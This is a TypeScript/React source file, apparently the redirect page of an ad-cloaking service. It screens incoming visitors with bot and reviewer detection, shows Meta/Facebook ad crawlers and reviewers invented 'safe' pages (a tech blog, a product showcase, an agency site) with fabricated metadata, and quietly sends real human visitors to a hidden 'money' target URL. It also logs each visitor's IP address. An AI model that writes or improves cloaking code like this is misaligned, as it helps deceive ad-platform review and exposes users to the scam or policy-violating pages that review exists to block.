import React from 'react';
import { headers } from 'next/headers';
import { notFound, redirect } from 'next/navigation';
import { storage } from '@/lib/storage';
import { detectBot, buildTargetUrlWithParams } from '@/lib/bot-detector';
import TechBlogTemplate from '@/components/SafeTemplates/TechBlogTemplate';
import EcommerceProductTemplate from '@/components/SafeTemplates/EcommerceProductTemplate';
import AgencyServiceTemplate from '@/components/SafeTemplates/AgencyServiceTemplate';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

interface PageProps {
  params: { slug: string };
  searchParams: Record<string, string | string[] | undefined>;
}

// Generate dynamic OpenGraph metadata for Meta ad crawler preview cards
export async function generateMetadata({ params }: PageProps) {
  const { slug } = params;
  const link = storage.getLinkBySlug(slug);

  if (!link) {
    return {
      title: 'Link Not Found',
    };
  }

  if (link.safePageType === 'ecommerce-showcase') {
    return {
      title: 'ErgoFlex Workspace Series — Smart Lifestyle Essentials',
      description: 'Explore precision ergonomic workspace organizers and lifestyle essentials. 30-day money-back guarantee with free priority shipping.',
      openGraph: {
        title: 'ErgoFlex Workspace Series — Smart Lifestyle Essentials',
        description: 'Explore precision ergonomic workspace organizers and lifestyle essentials.',
        type: 'website',
        siteName: 'AuraLiving Goods Store',
        locale: 'en_US',
      },
      twitter: {
        card: 'summary_large_image',
        title: 'ErgoFlex Workspace Series',
        description: 'Smart lifestyle essentials and ergonomic gear.',
      },
    };
  } else if (link.safePageType === 'agency-services') {
    return {
      title: 'Vanguard Digital Advisory — Enterprise Growth Architectures',
      description: 'Data-driven growth strategy, omnichannel performance optimization, and privacy-compliant user funnels for modern businesses.',
      openGraph: {
        title: 'Vanguard Digital Advisory — Enterprise Growth Architectures',
        description: 'Data-driven growth strategy and privacy-compliant digital roadmaps.',
        type: 'website',
        siteName: 'Vanguard Digital Advisory Group',
        locale: 'en_US',
      },
    };
  }

  // Default: Tech Editorial Publication (Highest authority for Facebook Ads)
  return {
    title: '2026 Consumer Technology & Productivity Guide | TechPulse Digest',
    description: 'Independent laboratory testing and consumer guide: Top hardware, connectivity, and digital workflow tools transforming daily productivity in 2026.',
    openGraph: {
      title: '2026 Consumer Technology & Productivity Guide | TechPulse Digest',
      description: 'Independent laboratory testing and consumer guide for 2026 digital tools.',
      type: 'article',
      siteName: 'TechPulse Digest',
      locale: 'en_US',
    },
    twitter: {
      card: 'summary_large_image',
      title: '2026 Consumer Technology & Productivity Guide',
      description: 'Independent laboratory benchmarks and buyer recommendations.',
    },
  };
}

export default function RedirectPage({ params, searchParams }: PageProps) {
  const { slug } = params;
  const link = storage.getLinkBySlug(slug);

  if (!link) {
    return (
      <div className="min-h-screen bg-slate-50 flex flex-col items-center justify-center text-slate-900 px-4 text-center">
        <div className="w-12 h-12 rounded-2xl bg-slate-200 flex items-center justify-center mb-4 text-slate-500 font-bold">
          404
        </div>
        <h1 className="text-xl font-bold text-slate-900 mb-2">Campaign Link Not Found</h1>
        <p className="text-slate-500 text-xs max-w-sm">This link may be inactive, paused, or modified by the campaign administrator.</p>
      </div>
    );
  }

  // Extract client headers
  const headersList = headers();
  const userAgent = headersList.get('user-agent') || '';
  const ip = headersList.get('x-forwarded-for')?.split(',')[0].trim() || 
             headersList.get('x-real-ip') || 
             '127.0.0.1';
  const country = headersList.get('x-vercel-ip-country') || 
                  headersList.get('cf-ipcountry') || 
                  'US';
  const referrer = headersList.get('referer') || '';

  // Flatten search params
  const urlParams: Record<string, string> = {};
  for (const [key, value] of Object.entries(searchParams)) {
    if (typeof value === 'string') {
      urlParams[key] = value;
    } else if (Array.isArray(value) && value.length > 0) {
      urlParams[key] = value[0];
    }
  }

  // Execute bot & ad reviewer inspection
  const detection = detectBot(
    userAgent,
    headersList,
    link.sensitivity,
    link.requireFbclid,
    urlParams
  );

  // Geo validation
  if (link.allowedCountries && link.allowedCountries.length > 0 && !detection.isBot) {
    const isGeoAllowed = link.allowedCountries.includes(country.toUpperCase());
    if (!isGeoAllowed) {
      detection.isBot = true;
      detection.reasons.push(`Geo Filter: Origin ${country} not in allowed list`);
    }
  }

  // Device validation
  if (link.allowedDevices && link.allowedDevices.length > 0 && !detection.isBot) {
    const isDevAllowed = link.allowedDevices.includes(detection.device as any);
    if (!isDevAllowed) {
      detection.isBot = true;
      detection.reasons.push(`Device Filter: ${detection.device} not in allowed device targets`);
    }
  }

  const actionTaken = detection.isBot ? 'served-safe-page' : 'redirected-to-target';

  // Real-time Traffic Logging
  storage.recordClick(link.id, detection.isBot, {
    linkId: link.id,
    slug: link.slug,
    timestamp: new Date().toISOString(),
    ip,
    country,
    device: detection.device,
    browser: detection.browser,
    os: detection.os,
    referrer,
    userAgent,
    isBot: detection.isBot,
    detectionReasons: detection.reasons,
    actionTaken,
    urlParams,
  });

  // 1. ROUTE TO SAFE COMPLIANT PAGE FOR BOTS / REVIEWERS
  if (detection.isBot) {
    if (link.safePageType === 'custom-url' && link.customSafeUrl) {
      redirect(link.customSafeUrl);
    }

    if (link.safePageType === 'ecommerce-showcase') {
      return <EcommerceProductTemplate slug={slug} />;
    } else if (link.safePageType === 'agency-services') {
      return <AgencyServiceTemplate slug={slug} />;
    } else {
      return <TechBlogTemplate slug={slug} />;
    }
  }

  // 2. ROUTE TO MONEY/TARGET PAGE FOR REAL HUMAN VISITORS (0% Drop Rate)
  const finalDestination = buildTargetUrlWithParams(link.targetUrl, urlParams, link.preserveUtms);

  // Server-side Direct 302
  if (link.redirectMethod === 'direct-302') {
    redirect(finalDestination);
  }

  // Ultra-Fast Zero-Drop Client Meta-Refresh + Immediate JS Location Replace
  return (
    <html lang="en">
      <head>
        <meta httpEquiv="refresh" content={`0;url=${finalDestination}`} />
        <meta name="robots" content="noindex, nofollow" />
        <title>Connecting securely...</title>
      </head>
      <body style={{ margin: 0, padding: 0, backgroundColor: '#f8fafc', height: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'sans-serif' }}>
        <noscript>
          <meta httpEquiv="refresh" content={`0;url=${finalDestination}`} />
          <p style={{ color: '#64748b', fontSize: '13px' }}>
            Redirecting... If you are not redirected automatically, <a href={finalDestination} style={{ color: '#4f46e5', fontWeight: 'bold' }}>click here</a>.
          </p>
        </noscript>
        <div style={{ textAlign: 'center' }}>
          <div style={{
            width: '32px',
            height: '32px',
            border: '3px solid #e2e8f0',
            borderTop: '3px solid #4f46e5',
            borderRadius: '50%',
            animation: 'spin 0.6s linear infinite',
            margin: '0 auto 12px'
          }}></div>
          <p style={{ color: '#64748b', fontSize: '13px', fontWeight: '500' }}>Connecting to secure destination...</p>
        </div>
        <style dangerouslySetInnerHTML={{ __html: `@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }` }} />
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                try {
                  window.location.replace(${JSON.stringify(finalDestination)});
                } catch(e) {
                  window.location.href = ${JSON.stringify(finalDestination)};
                }
              })();
            `,
          }}
        />
      </body>
    </html>
  );
}
